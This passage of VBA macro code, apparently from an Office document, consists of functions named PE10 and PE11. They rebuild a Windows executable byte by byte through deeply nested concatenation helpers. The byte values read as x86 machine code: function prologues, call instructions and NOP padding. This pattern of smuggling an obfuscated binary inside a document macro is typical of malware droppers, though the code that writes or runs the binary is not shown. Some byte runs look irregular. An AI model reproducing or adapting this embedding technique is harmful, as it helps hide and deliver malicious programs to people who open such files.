    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(strPE, "@"), 16), "P"), 255), 21), 243), 192), 127), 0), 199), "F@"), 0), 0), 0), 0), "{"), 192), "^"), 241), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 236), "m"), 28), 203), 241), 251), 20), "V"), 139), "u"), 8), "W"), 139), "}"), 12), 139)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "V"), 16), "j"), 0), "WR"), 137), "F"), 8), 137), "N"), 245), 232), "m"), 174), 0), 0), 139), "F"), 20), 144), 0), "W"), 184), 232), "a"), 6), 0), 0), 131), 196), 10), "_^]"), 195), 144), 144), 144), 144), 247), 9), 144), 240), 144), 144), "U"), 139), 236), "S")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 139), 220), 12), "Vv:PSd"), 207), 226), 255), 255), 139), "u"), 211), 23), 248), "1"), 238), 139), 215), 221), 20), 0), 0), 0), "j8"), 243), 131), 175), 22), 137), 255), 232), 6), "9"), 8), "Q"), 232), 175), 226), 255), 255), "Fy3"), 192), 139)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 215), 185), 14), 0), 0), 0), 243), "u"), 139), 6), "j8"), 137), ","), 16), 139), 14), 139), "Q"), 16), 137), 26), 139), 248), 139), 8), "Q"), 232), 138), 226), 255), 255), 139), 248), "3"), 192), 139), "r."), 14), 0), 0), 0), 243), "Y"), 139), "5j"), 0), "S")
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 192), 1), 137), "P"), 232), 172), 14), 139), "Q"), 143), 213), 26), 139), 6), 199), "84"), 1), 251), 0), 0), 139), 14), "y"), 193), 154), "Q"), 17), 8), 195), 255), 255), "_^[]"), 195), 144), 144), 144), 18), 139), 5), "V"), 139), "u"), 8), "R"), 231), 158)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(strPE, "@"), 0), 154), 139), 6), "P"), 232), "m"), 238), 222), 255), "V-"), 181), 254), 255), 255), 131), 196), 12), "^]"), 194), 171), 0), 144), 144), 148), 144), 144), 144), 144), "}"), 144), 144), 148), "s"), 144), "U"), 139), 236), 129), 236), 16), 2), 0), 0), "S/"), 140)
    strPE = B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 8), "VWrC"), 4), 131), 248), 255), 15), 132), 148), "~"), 0), 0), 139), "K"), 16), 133), 201), "y"), 132), 137), 1), 0), 0), 139), "u"), 12), 183), 20), 20), 141), "V"), 171), "@RP"), 255), 21), 164), 193), "@"), 0), " "), 248), 255), 15), 160), "7")
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 241), 0), 7), 139), "5"), 216), 193), 229), 244), 255), 214), 133), 192), 15), 21), 249), 0), 0), 0), 255), 214), 5), 128), "c"), 10), 0), "="), 179), "#"), 249), 0), 15), 133), "Q"), 217), 0), 0), 139), "w "), 139), 186), 238), 139), 199), 11), 198), 237), "w_")
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "h"), 184), 180), "#"), 11), 0), "["), 139), 229), "]"), 194), 8), 0), 139), "C"), 4), 248), 1), 0), 0), 0), 133), 193), 137), 133), 244), 253), 255), 255), 198), 141), 240), 253), 255), 255), 137), 133), 248), 254), 255), 255), 137), 141), 244), 254), 255), 255), 127), 10), "|")
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(strPE, 4), "1"), 255), "s"), 4), "3"), 12), 235), "%j"), 245), "h@B"), 15), 0), "VW"), 232), 151), "L"), 0), 0), "j"), 0), "l@"), 252), 13), 0), "VWDE"), 248), 232), 131), "N"), 0), 0), "uE"), 252), 141), "E"), 251), 141), 141), 244), 254)
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 255), 255), 150), "Q"), 149), 240), 253), 173), 255), "QR"), 232), 0), "jA"), 255), 21), "*"), 149), "@"), 0), 24), 248), "K"), 137), "E"), 8), "tM"), 133), "Ou"), 181), "_^"), 184), 204), "#"), 11), "+"), 244), 139), "]]"), 194), 8), 0), 139), 133), 4)

    PE10 = strPE
End Function

Private Function PE11() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 141), 133), 244), 254), "|"), 255), "PQ"), 232), 13), "P"), 210), 0), 133), 192), "t^"), 139), "K"), 4), "M2("), 141), "E"), 8), 179), "Pv"), 7), 16), 0), "2h"), 255), 255), 0), 12), "Q"), 199), "E"), 151), "}"), 156), 0), "v"), 255), 21), 160), 193)
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 138), 244), "~"), 192), "t"), 159), 139), "5"), 216), 193), "@"), 172), 255), 214), 133), 192), "u"), 11), "_^3"), 192), "["), 139), 229), "]@"), 8), 0), 255), 214), "_^l"), 128), 252), 10), 0), "[H"), 229), "]"), 233), 8), 0), 139), "E8"), 214), 192)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "u"), 235), "_^["), 139), 229), 18), 194), 8), 229), 139), 235), 12), 139), "C"), 16), 137), "s"), 230), "f"), 131), "x*"), 0), 185), 7), 199), "C,"), 1), 0), 224), 0), 139), "H"), 210), 139), "p "), 191), ","), 4), 186), 180), "Z"), 238), 243), 166), 25)
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 176), "_"), 199), "C0"), 1), 236), 0), "-^3"), 192), "["), 139), 229), "]"), 194), 8), 0), 184), 239), "u"), 207), 0), "_^["), 139), "o]"), 194), 8), 150), 144), "Z"), 144), "U"), 139), 236), 131), 236), 8), 141), "E"), 248), "VP"), 212), 21), "x")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(strPE, "d"), 172), 0), 139), "U"), 252), 139), "m"), 248), "3"), 2), "3"), 201), 164), 214), "V"), 11), 20), "j"), 10), "%Q"), 232), "gK"), 0), 0), "N"), 201), "@"), 174), "H"), 227), 129), 218), 150), "^)"), 0), 139), 229), "]"), 31), 144), 180), 144), 144), 144), 144), 144)
    strPE = A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "U"), 17), 236), 139), "t"), 12), "3"), 201), "V3"), 215), "f"), 139), "H"), 14), 252), 12), 211), 141), 12), 137), 141), 20), 137), 139), "M"), 8), 193), "y"), 3), 137), 17), "3"), 210), "f"), 140), "P"), 12), "TQ"), 225), "3"), 250), "f"), 139), 31), 10), 137), "Q"), 8)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "3Jf"), 139), "P"), 8), 179), "Q"), 12), "3"), 210), "f"), 139), "<"), 6), 21), "Qm3)f"), 139), "PhJ"), 137), 252), 20), "3"), 206), "f"), 131), 16), 129), 234), 190), 7), 0), 0), 137), 153), 24), 233), 210), "f"), 139), "P"), 4), "AQ")
    strPE = B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 28), 139), "Q"), 20), "f"), 139), "p"), 6), 139), 20), 149), "@"), 194), "@"), 0), 141), "T)"), 255), "3"), 246), 137), 6), " 3"), 210), 137), "Q$"), 137), 136), "(f"), 139), "0"), 139), 198), 132), 3), 136), 0), 128), "y"), 5), "H"), 131), 200), 252), "@u")
    strPE = A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(strPE, "*"), 202), 198), "a"), 153), 191), 144), "%"), 0), 0), 247), 255), "_"), 133), 210), "u"), 26), 139), 198), 190), "d"), 0), 0), 195), 153), 230), 254), 133), 210), "t"), 156), 139), ">"), 25), 131), 248), ":~"), 4), "@"), 137), "A"), 187), "^]"), 195), 144), 144), 144), 144)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 144), 144), 144), "R"), 144), 144), 144), 144), "U"), 139), 236), 129), 236), 224), 0), 0), 235), "S"), 29), 139), "<6"), 190), 139), "}"), 12), 139), 206), 139), "7j"), 0), 5), 0), "@"), 134), "Hj"), 212), 180), 209), 150), "^"), 161), 0), "QP"), 232), 4), "P")
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 137), "+"), 236), 139), 220), 193), 248), 31), 180), 220), 8), "A"), 0), 137), "U"), 240), 131), 248), 31), 15), 171), 228), 0), 0), 0), 141), "M"), 252), "Q"), 176), 178), 1), 252), "M"), 131), 195), 4), 141), 224), 220), 141), "E"), 236), "RP"), 255), 21), "k")
    strPE = A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(strPE, 192), "@"), 230), 139), "E"), 252), 141), "M"), 204), "eU"), 220), "QRP"), 255), 21), 189), 192), "@"), 0), 139), "X"), 8), 155), "M"), 204), "QS"), 232), 178), 226), 255), 255), 131), 196), 8), "j"), 0), "h@d"), 15), 0), "VWI"), 177), "K"), 10)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 0), 137), "Z"), 141), "U"), 244), 141), "E"), 204), "RP"), 255), 21), 210), 192), "@"), 0), "5U"), 248), 139), "E"), 244), "4(3"), 201), 11), 214), "V"), 11), 200), "j"), 10), "RQ"), 232), 201), "I"), 221), 0), "-z"), 205), 134), "HV"), 129), 218), 150)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "^)"), 0), "h@B"), 15), 230), "RP"), 232), 177), "I"), 0), 0), 139), "M"), 16), "j"), 0), "h@+"), 15), 0), "QW"), 139), 240), 219), 254), "I"), 0), 0), "W"), 240), 139), "E"), 252), 137), "s("), 139), "xT"), 139), 8), 3), 249), "f")
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 137), 136), 136), 136), 247), 178), 139), "\"), 184), 197), 5), 162), 145), 3), 207), 11), "%"), 5), 139), 209), 193), 234), 31), "u"), 175), 247), 0), 3), 214), 193), 250), 11), 167), 194), 3), 209), 193), 232), 139), 3), 194), 203), 25), "$9^3"), 192), "P"), 139)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(strPE, 229), "]"), 146), 241), 0), 240), "M("), 141), "F"), 236), 14), "N"), 255), 27), 132), 192), "@"), 0), 141), "E"), 220), 151), "h!P"), 21), "("), 21), "|"), 192), "@"), 0), 139), 156), 8), 141), 245), 179), "RSJ"), 222), 226), 255), 255), 131), 196), 8), "j")
    strPE = B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 0), "V"), 203), "B"), 15), 0), "VW"), 232), 19), "J"), 0), 0), "?"), 3), 141), "G "), 255), 255), 219), "P"), 255), 21), 128), 192), "@"), 0), "3"), 201), "+"), 193), "C^Ht"), 167), "Hup"), 139), 141), " "), 255), 255), 255), 139), "U"), 156), "_")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(strPE, 199), "C$"), 1), "."), 0), 0), 141), 4), 10), "^"), 139), 200), 212), 225), 4), "+"), 200), 247), 217), 193), 225), 2), 131), "K"), 250), "3"), 192), "["), 139), 229), "]"), 194), 12), 0), 139), 149), " "), 255), 255), 244), 221), 133), "t"), 255), 255), 202), 3), 194), 137)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 234), 170), 139), 136), "_Q"), 222), 4), "+"), 200), "^"), 188), 217), 193), 225), 2), 137), "K(3"), 192), "["), 139), 229), "]"), 194), "J"), 0), 139), 133), " Z"), 255), 154), 23), "K$"), 139), 208), 193), 226), 4), "+"), 208), 6), 218), 193), 226), 2), 137)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 172), "(_^3"), 192), 222), 139), 165), "]"), 194), "X"), 0), 144), 144), 144), 144), 144), 144), 144), 210), 139), "3"), 161), "@"), 5), "A"), 0), 133), 192), "u*h@"), 230), "A"), 0), 255), 28), 128), 192), "@"), 0), 13), 236), 4), "A"), 0), 139), "E")
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 8), 199), 5), "@"), 5), "A"), 0), 1), 0), 0), 0), 199), 0), 179), 4), "I"), 0), 161), 236), 4), "A"), 0), "]"), 195), 139), "M"), 8), 169), 1), "@"), 4), "A"), 233), 161), 236), "mA"), 0), "]"), 195), 144), 227), 144), 29), 144), "p"), 177), 252), "B"), 248)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 152), 152), 146), 144), "IJ"), 253), 253), "H"), 146), "'"), 245), 245), 245), 159), 245), "A"), 253), 252), 144), 253), "C"), 248), 146), 152), "7"), 159), 155), 253), "K?H"), 248), 152), "I"), 147), "'"), 249), "H@"), 155), 214), "HHK@"), 214), "CB"), 253)
    strPE = A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "H/"), 146), 248), 248), 248), 253), "I7'H"), 145), 144), "I"), 153), "H"), 159), 214), "KJ"), 245), 159), "IK'"), 145), 249), 152), "@"), 147), 147), 245), 159), 248), "K@@"), 248), 145), "7KAAJ"), 249), 249), 248), "?A"), 159)
    strPE = B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 146), 144), "?H"), 159), "?"), 252), 249), 153), 152), 245), 159), "'7"), 249), 249), "@"), 145), 248), 252), 153), 147), 253), 245), 146), "H"), 159), 152), 248), "C"), 159), 153), "B"), 233), 129), 168), 255), 255), 1), "W"), 241), 21), 168), 0), "@"), 0), "f"), 137), "F*")
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "f"), 137), 218), 12), 131), 251), 2), "u"), 225), "r"), 16), 0), 18), 25), 199), "F"), 24), 4), 0), 0), "e"), 137), "F"), 20), 137), 252), 28), 208), "x,"), 137), "F8_^[]"), 195), 213), 144), 144), 144), "U"), 225), 236), 139), "Q"), 8), 139), "M")
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 12), 139), "UhS"), 139), "]"), 20), "V"), 31), 0), 0), 0), "'"), 253), "W"), 199), 1), 0), 160), 0), 0), 139), 19), 131), 201), 194), 3), 192), "f"), 199), 2), 0), 0), 242), 174), 247), 154), 231), 141), "]"), 25), "];j"), 139), 254), "r"), 227), 161)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(strPE, 152), 193), "@"), 0), 131), "8"), 1), "~"), 18), "3"), 201), "j"), 4), 138), 15), 19), 255), 182), "D"), 193), "@"), 0), 131), 196), 8), 235), 17), 161), "x"), 193), "@*3"), 210), 228), 23), 139), 8), 138), "xQ"), 131), 205), 4), 133), 251), "t"), 7), "O;")
    strPE = B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(strPE, 251), "s"), 202), 235), "O;"), 251), "i"), 236), "S"), 255), 21), "l"), 138), "r"), 0), 131), 196), 4), 249), 248), 1), "|#="), 255), 255), 0), 216), 127), "}"), 176), "U"), 16), "_"), 3), "[f"), 137), "D3"), 192), 182), 194), "u"), 0), "{?"), 247), "u")
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "6;"), 254), "s27"), 251), "u"), 12), "_^"), 184), 22), 0), 0), 208), " *"), 194), 20), 0), 141), 135), 1), "P"), 255), 21), "l"), 193), "@"), 188), 131), 196), 4), 131), 248), 1), "|"), 226), "="), 10), 220), 0), 0), 127), 219), 139), "M"), 28), 141)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(strPE, "w*L"), 137), "0+"), 243), 231), "E"), 24), 204), 139), 222), 141), "S"), 1), "R"), 31), 232), "Y"), 219), 255), 149), 139), "U"), 8), 139), "u"), 20), 139), 203), 139), "7"), 137), 2), 181), 193), 193), 233), 2), 243), 28), 139), 200), 131), 225), 3), "3"), 130), 223)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "N"), 139), 10), "_^"), 198), 4), 11), 191), "[]"), 194), 209), 0), "["), 139), 236), 139), "M"), 24), 139), "UL"), 139), 193), 156), 139), "u"), 12), 131), 224), 3), "W"), 199), 2), 0), 0), 0), 150), 193), 232), 133), 246), "t"), 28), 139), "}"), 220), 133), 255)
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "?"), 21), 131), 248), 3), "t"), 16), 15), 193), 2), "t"), 29), "_"), 184), "k"), 17), 1), 0), "^]"), 194), 24), "!_"), 184), 22), 0), "p"), 0), "^]"), 194), ";"), 0), 139), "E"), 19), 183), 192), "u"), 249), 184), 213), 144), 0), 0), 139), "}"), 28), "W")
    strPE = A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "Q"), 139), "M"), 20), "Q"), 180), "ZR"), 0), 13), 0), 0), 0), 131), 196), 24), "_^]"), 194), 166), 0), 144), 212), "P"), 144), "U"), 139), 236), 131), 236), "$oV"), 139), 155), 12), "3"), 219), "9"), 243), "W"), 231), "u"), 244), "u"), 5), 190), "@"), 146)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "@"), 0), 166), 184), "<0"), 15), 140), 185), 0), 0), 0), 184), 170), 15), 143), 177), 0), 0), 0), "h4"), 244), "@"), 179), 174), 153), 21), 28), 243), "@"), 0), 139), 208), 139), 254), 131), 27), 255), "3|T"), 196), 8), 242), 174), 247), 209), "I;")
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 209), 15), 133), 140), 0), "["), 0), "V"), 255), 21), 200), 193), "@"), 0), 137), 230), 248), 141), "E"), 248), 141), "M"), 236), 141), "U"), 220), 137), 34), 236), "u]"), 240), 137), "M"), 232), 137), "U"), 12), 139), "E"), 12), 139), "H"), 12), "9"), 25), 15), 132), 168), 0)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 127), 0), 137), "]"), 252), 139), "U"), 28), "j8x"), 232), 173), 218), 255), 255), 139), "=3+"), 139), 247), 185), "F"), 234), 0), 0), 243), 171), 139), "E"), 246), 139), "M"), 12), 139), "R"), 252), 137), 6), 134), "Q"), 12), 228), 4), 23), 139), "U"), 20), "R")
    strPE = A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(strPE, "j"), 2), "JqV"), 137), "N,"), 232), "~"), 253), "i"), 255), 131), "*"), 12), 133), 24), 220), "C"), 139), "E"), 176), 133), 192), "t"), 13), "P"), 139), "5"), 28), "Ph"), 221), 149), 143), 255), 137), "F"), 4), 139), "M"), 8), 137), "1"), 235), "jV"), 255), 21)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 172), 193), "@"), 0), ";~"), 137), "E"), 19), "#"), 245), 139), 141), 216), 168), "@"), 0), 6), 214), 133), 192), "t/"), 255), 214), "_^"), 5), 128), 252), 10), 0), "["), 139), "-]c"), 139), "S"), 191), 137), "V"), 4), 137), "sYgE"), 12), 131)
    strPE = B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(strPE, 163), 4), 139), 222), 137), "}"), 252), 1), "H"), 12), 131), "S"), 15), 0), 10), 133), "["), 255), 255), 255), "_^"), 159), 192), "["), 193), 229), 24), 195), "WU"), 139), 236), "]"), 133), "T"), 2), 0), 0), 139), "M"), 12), "'Vw"), 170), 139), 255), 212), "Q")
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(strPE, 4), 137), "E"), 244), 241), 170), 16), "W"), 137), "u"), 236), "Yf"), 137), "u"), 252), 132), 192), 137), "u"), 224), 177), "u"), 240), 137), "u"), 212), 137), "U"), 220), 15), 132), 170), 10), 165), 145), 139), "]"), 20), "<%t"), 244), 139), "k9"), 133), 192), "t-")
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(strPE, ";E"), 220), "_"), 28), 139), "}"), 12), "W"), 175), 7), 188), "U"), 8), 131), 196), 4), 210), "p"), 15), "c"), 245), 10), 0), 0), 139), "O"), 4), 139), 221), 137), "M"), 220), 139), 158), 16), "@"), 137), 253), 244), 138), 10), 136), 221), 255), 210), "E"), 236), 233), "T")
    strPE = B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 10), 0), 0), 139), "}"), 16), 139), 13), 154), 29), "@J"), 184), 228), 0), 0), 0), "3nG9"), 1), 137), 178), 188), 137), "E"), 192), "zU"), 200), 137), "U"), 196), 137), "U"), 212), 198), "E"), 23), "L"), 136), "U"), 251), 137), 143), 16), "}"), 18), "X")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 23), "j"), 2), "R"), 255), 21), "h"), 193), "@"), 0), 131), 196), 8), "3"), 210), 235), 18), 139), ",x"), 193), "@"), 0), "3"), 192), "p"), 7), "?"), 9), 138), 4), "A"), 131), 159), 2), ";Y"), 156), 133), 174), 26), 0), 219), 185), 1), 0), 0), 25), 138), 7)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(strPE, "<-u"), 6), 137), "U"), 192), "G@"), 167), "<+u"), 6), 137), "M"), 196), "i"), 235), 234), "<#u>"), 206), "M,"), 29), 235), 224), "< u"), 6), 157), "MgG"), 235), 214), "y0"), 249), 6), 188), 252), 23), 138), 235), 204)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 161), 226), 193), 128), 34), 137), "}"), 30), "9"), 8), "~)3"), 201), "j"), 4), 138), 15), "y"), 255), 21), 131), 193), "@"), 0), 131), 254), 8), 193), 210), 235), 18), 139), 13), "x"), 193), "@"), 0), "3"), 129), 138), 7), 139), "H"), 138), 4), "A"), 24), 224), "+")
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, ";"), 194), "t]"), 15), 190), 15), 131), "*0G"), 137), "}"), 16), 149), 21), "#"), 193), "@"), 0), ",M"), 224), 131), ":"), 1), 242), 21), "3"), 192), "|"), 4), 138), 7), "P"), 255), 21), "h"), 193), "@"), 0), 139), "MW"), 131), 196), 217), 216), 17), 161)
    strPE = B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(strPE, "~"), 193), "J"), 0), "$"), 210), 138), 23), 139), 0), 223), "pP"), 131), 224), 194), "3"), 210), ";"), 132), "t"), 13), 15), 190), 226), 141), 12), 137), "G"), 255), "LJ"), 131), 235), 185), 137), "}"), 249), 199), "E"), 204), 1), "s"), 0), 0), 235), "u"), 128), 196), "*")
    strPE = B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(strPE, "u"), 209), 22), 3), 131), 253), 4), "G"), 185), 194), 137), "}"), 16), 199), "E"), 204), 1), 0), "4"), 224), "}"), 5), 137), "U"), 192), 170), 216), 137), "E"), 224), 140), 3), 137), "U"), 172), 128), "?."), 15), 133), 209), 0), 0), "k"), 161), "t"), 199), 140), 0), "G")
